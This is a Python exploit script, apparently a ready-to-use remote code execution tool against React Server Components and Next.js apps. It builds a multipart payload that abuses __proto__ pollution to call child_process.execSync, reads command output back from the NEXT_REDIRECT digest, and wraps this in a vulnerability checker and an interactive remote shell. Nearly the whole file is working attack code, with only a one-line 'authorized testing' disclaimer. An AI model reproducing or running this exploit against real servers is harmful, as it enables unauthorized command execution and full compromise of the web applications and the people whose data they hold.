#!/usr/bin/env python3
"""
React Server Components RCE - Interactive Shell Client
Exploit: __proto__ pollution via multipart RSC payload + child_process.execSync
Target: React Server Components apps (Next.js, etc.) with vulnerable endpoints

Features:
- Auto-detects vulnerability using mathematical computation
- Interactive shell with command history
- Single-shot command execution
- Built-in commands for pivoting and header manipulation

Usage:
  python3 reactshell.py -u http://localhost:3000
  python3 reactshell.py -u http://localhost:3000 -c "whoami"  # single command
  python3 reactshell.py -u http://localhost:3000 --skip-check  # bypass vuln check
"""

import requests
import argparse
import sys
import uuid
import re
import urllib3
import readline  # for command history support
import random
from urllib.parse import urlparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ─── ANSI Colors ──────────────────────────────────────────────────────────────
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
DIM    = "\033[2m"
RESET  = "\033[0m"

BANNER = f"""
{CYAN}{BOLD}
  ██████╗ ███████╗ █████╗  ██████╗████████╗    ███████╗██╗  ██╗███████╗██╗     ██╗     
  ██╔══██╗██╔════╝██╔══██╗██╔════╝╚══██╔══╝    ██╔════╝██║  ██║██╔════╝██║     ██║     
  ██████╔╝█████╗  ███████║██║        ██║       ███████╗███████║█████╗  ██║     ██║     
  ██╔══██╗██╔══╝  ██╔══██║██║        ██║       ╚════██║██╔══██║██╔══╝  ██║     ██║     
  ██║  ██║███████╗██║  ██║╚██████╗   ██║       ███████║██║  ██║███████╗███████╗███████╗
  ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝   ╚═╝       ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
{RESET}
{DIM}  React Server Components RCE Shell  │  __proto__ pollution via RSC deserialization{RESET}
{YELLOW}  ⚠  For authorized penetration testing and CTF use only{RESET}
"""


def build_payload(command: str, boundary: str) -> bytes:
    """
    Construct the multipart body with the RCE payload injected into _prefix.
    The command output is exfiltrated via the NEXT_REDIRECT error digest.
    """
    # Escape single quotes in command for shell safety
    safe_cmd = command.replace("'", "'\\''")

    prefix = (
        "var res=process.mainModule.require('child_process')"
        f".execSync('{safe_cmd}',{{'timeout':10000}}).toString().trim();;"
        "throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});"
    )

    part0 = (
        "{\n"
        '  "then": "$1:__proto__:then",\n'
        '  "status": "resolved_model",\n'
        '  "reason": -1,\n'
        '  "value": "{\\"then\\":\\"$B1337\\"}",\n'
        '  "_response": {\n'
        f'    "_prefix": "{prefix}",\n'
        '    "_chunks": "$Q2",\n'
        '    "_formData": {\n'
        '      "get": "$1:constructor:constructor"\n'
        '    }\n'
        '  }\n'
        "}"
    )

    sep = f"------{boundary}"
    body = (
        f"{sep}\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{part0}\r\n"
        f"{sep}\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f'"$@0"\r\n'
        f"{sep}\r\n"
        f'Content-Disposition: form-data; name="2"\r\n\r\n'
        f"[]\r\n"
        f"{sep}--\r\n"
    )
    return body.encode()


def decode_escapes(s: str) -> str:
    """Decode escape sequences like \\n, \\t, etc."""
    try:
        # Use codecs.decode to handle escape sequences properly
        import codecs
        return codecs.decode(s, 'unicode_escape')
    except:
        # Fallback to manual replacement
        return s.replace('\\n', '\n').replace('\\t', '\t').replace('\\r', '\r')


def extract_output(response: requests.Response) -> str | None:
    """
    Parse command output from the NEXT_REDIRECT digest in various response locations.
    React Server Components leak the digest in JSON error responses or redirect headers.
    """
    # Try JSON body first (common in API error responses)
    try:
        data = response.json()
        digest = (
            data.get("digest")
            or (data.get("error") or {}).get("digest")
            or data.get("message", "")
        )
        if digest and "NEXT_REDIRECT" not in str(digest):
            # digest is raw output
            return decode_escapes(str(digest).strip())
        if digest:
            # sometimes format is "NEXT_REDIRECT;replace;<output>"
            parts = str(digest).split(";")
            if len(parts) >= 3:
                return decode_escapes(parts[-1].strip())
    except Exception:
        pass

    # Try raw text body (error page)
    text = response.text
    # Pattern: digest`<output>` or digest:<output>
    for pattern in [
        r'digest[`:]([^`\n"<]{1,4096})',
        r'"digest"\s*:\s*"([^"]+)"',
        r'NEXT_REDIRECT[^;]*;[^;]*;([^\n<"]{1,4096})',
    ]:
        m = re.search(pattern, text, re.DOTALL)
        if m:
            result = m.group(1).strip().rstrip("`")
            if result:
                return decode_escapes(result)

    # Check Location header for redirect with digest
    location = response.headers.get("Location", "")
    if location:
        m = re.search(r'digest=([^&]+)', location)
        if m:
            return decode_escapes(m.group(1).strip())

    return None


def confirm_vulnerability(session: requests.Session, target_url: str,
                         next_action: str, extra_headers: dict, timeout: int,
                         verify_ssl: bool) -> tuple[bool, str]:
    """
    Confirm if the target is vulnerable using mathematical computation.
    Returns (is_vulnerable, method_used).
    """
    print(f"{CYAN}[*] Testing vulnerability...{RESET}")
    
    try:
        # Mathematical computation test
        a, b = random.randint(1000, 9999), random.randint(100, 999)
        expected = a + b
        test_cmd = f"expr {a} + {b}"
        print(f"{DIM}    → {test_cmd}{RESET}")
        
        output = send_command(session, target_url, test_cmd, next_action,
                             extra_headers, timeout, verify_ssl)
        
        if str(expected) in output.strip():
            return True, f"math test ({a} + {b} = {expected})"
        
        return False, f"expected {expected}, got: {output[:50]}"
        
    except Exception as e:
        return False, f"test failed: {e}"


def send_command(session: requests.Session, target_url: str, command: str,
                 next_action: str, extra_headers: dict, timeout: int,
                 verify_ssl: bool) -> str:
    """Send the exploit request and return command output."""
    boundary = "WebKitFormBoundary" + uuid.uuid4().hex[:16]
    body = build_payload(command, boundary)

    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0"
        ),
        "Next-Action": next_action,
        "X-Nextjs-Request-Id": uuid.uuid4().hex[:16],
        "X-Nextjs-Html-Request-Id": uuid.uuid4().hex[:20],
        "Content-Type": f"multipart/form-data; boundary=----{boundary}",
        "Content-Length": str(len(body)),
        **extra_headers,
    }

    try:
        resp = session.post(
            target_url,
            data=body,
            headers=headers,
            timeout=timeout,
            verify=verify_ssl,
            allow_redirects=False,
        )
    except requests.exceptions.ConnectionError:
        return f"{RED}[!] Connection refused — is the target running?{RESET}"
    except requests.exceptions.Timeout:
        return f"{RED}[!] Request timed out after {timeout}s{RESET}"
    except Exception as e:
        return f"{RED}[!] Request error: {e}{RESET}"

    output = extract_output(resp)

    if output:
        return output
    else:
        return (
            f"{YELLOW}[~] No output extracted. "
            f"HTTP {resp.status_code}. "
            f"Check --next-action value or target path.\n"
            f"    Response snippet: {resp.text[:300]}{RESET}"
        )


def interactive_shell(session, args):
    """Drop into an interactive pseudo-shell loop."""
    parsed = urlparse(args.url)
    host = parsed.netloc
    prompt = f"{GREEN}{BOLD}[{host}]${RESET} "

    print(f"\n{CYAN}[*] Shell ready. Type commands or use built-ins:{RESET}")
    print(f"{DIM}    :exit / :quit   — exit the shell")
    print(f"    :url <url>      — switch target URL")
    print(f"    :action <val>   — change Next-Action header value")
    print(f"    :header k=v     — add/update a custom header")
    print(f"    :check          — re-run vulnerability confirmation{RESET}\n")

    while True:
        try:
            cmd = input(prompt).strip()
        except (EOFError, KeyboardInterrupt):
            print(f"\n{YELLOW}[*] Exiting.{RESET}")
            break

        if not cmd:
            continue

        # Built-ins
        if cmd in (":exit", ":quit", "exit", "quit"):
            print(f"{YELLOW}[*] Bye.{RESET}")
            break
        elif cmd.startswith(":url "):
            args.url = cmd[5:].strip()
            parsed = urlparse(args.url)
            host = parsed.netloc
            prompt = f"{GREEN}{BOLD}[{host}]${RESET} "
            print(f"{CYAN}[*] Target URL updated: {args.url}{RESET}")
            continue
        elif cmd.startswith(":action "):
            args.next_action = cmd[8:].strip()
            print(f"{CYAN}[*] Next-Action: {args.next_action}{RESET}")
            continue
        elif cmd.startswith(":header "):
            kv = cmd[8:].strip()
            if "=" in kv:
                k, v = kv.split("=", 1)
                args.extra_headers[k.strip()] = v.strip()
                print(f"{CYAN}[*] Header set: {k.strip()} = {v.strip()}{RESET}")
            else:
                print(f"{RED}[!] Usage: :header Key=Value{RESET}")
            continue
        elif cmd == ":check":
            is_vuln, method = confirm_vulnerability(
                session, args.url, args.next_action, args.extra_headers,
                args.timeout, not args.no_verify
            )
            if is_vuln:
                print(f"{GREEN}[✓] Target is VULNERABLE! Confirmed via: {method}{RESET}")
            else:
                print(f"{RED}[✗] Target does NOT appear vulnerable ({method}){RESET}")
            continue

        # Execute command
        print(f"{DIM}", end="", flush=True)
        output = send_command(
            session, args.url, cmd,
            args.next_action, args.extra_headers,
            args.timeout, not args.no_verify
        )
        print(f"{RESET}{output}")


def main():
    parser = argparse.ArgumentParser(
        description="React Server Components RCE — Interactive Shell",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Interactive shell with auto-detection
  python3 reactshell.py -u http://localhost:3000

  # Skip vulnerability check and go straight to shell
  python3 reactshell.py -u http://localhost:3000 --skip-check

  # Single command
  python3 reactshell.py -u http://localhost:3000 -c "id"

  # Custom Next-Action token + ignore SSL
  python3 reactshell.py -u https://target.com -a deadbeef --no-verify

  # Extra headers (e.g. auth cookie)
  python3 reactshell.py -u http://target.com --header "Cookie=session=abc123"
        """,
    )
    parser.add_argument("-u", "--url", required=True,
                        help="Target URL (e.g. http://localhost:3000/)")
    parser.add_argument("-c", "--command", default=None,
                        help="Single command to execute (non-interactive)")
    parser.add_argument("-a", "--next-action", default="x",
                        help="Next-Action header value (default: x)")
    parser.add_argument("-t", "--timeout", type=int, default=15,
                        help="Request timeout in seconds (default: 15)")
    parser.add_argument("--no-verify", action="store_true",
                        help="Disable SSL certificate verification")
    parser.add_argument("--header", action="append", default=[],
                        metavar="KEY=VALUE",
                        help="Extra request headers (repeatable)")
    parser.add_argument("--proxy", default=None,
                        help="HTTP proxy (e.g. http://127.0.0.1:8080)")
    parser.add_argument("--skip-check", action="store_true",
                        help="Skip vulnerability confirmation check on startup")

    args = parser.parse_args()

    # Parse extra headers
    args.extra_headers = {}
    for h in args.header:
        if "=" in h:
            k, v = h.split("=", 1)
            args.extra_headers[k.strip()] = v.strip()
        else:
            print(f"{RED}[!] Invalid header format (use Key=Value): {h}{RESET}")
            sys.exit(1)

    # Session setup
    session = requests.Session()
    if args.proxy:
        session.proxies = {"http": args.proxy, "https": args.proxy}

    print(BANNER)
    print(f"{BOLD}  Target     :{RESET} {args.url}")
    print(f"{BOLD}  Next-Action:{RESET} {args.next_action}")
    if args.proxy:
        print(f"{BOLD}  Proxy      :{RESET} {args.proxy}")
    print()

    # Vulnerability confirmation check
    if not args.skip_check:
        is_vuln, method = confirm_vulnerability(
            session, args.url, args.next_action, args.extra_headers,
            args.timeout, not args.no_verify
        )
        
        if is_vuln:
            print(f"{GREEN}[✓] Target is VULNERABLE! Confirmed via: {method}{RESET}")
            print(f"{GREEN}[✓] RCE confirmed — ready for exploitation{RESET}\n")
        else:
            print(f"{RED}[✗] Target does NOT appear vulnerable ({method}){RESET}")
            print(f"{YELLOW}[!] Continuing anyway... (use --skip-check to bypass this test){RESET}")
            print(f"{DIM}    Common issues: wrong Next-Action, wrong endpoint, app not using RSC{RESET}\n")
    else:
        print(f"{YELLOW}[~] Skipping vulnerability check (--skip-check enabled){RESET}\n")

    if args.command:
        # Single-shot mode
        print(f"{CYAN}[*] Executing: {args.command}{RESET}")
        output = send_command(
            session, args.url, args.command,
            args.next_action, args.extra_headers,
            args.timeout, not args.no_verify
        )
        print(output)
    else:
        # Interactive shell
        interactive_shell(session, args)


if __name__ == "__main__":
    main()
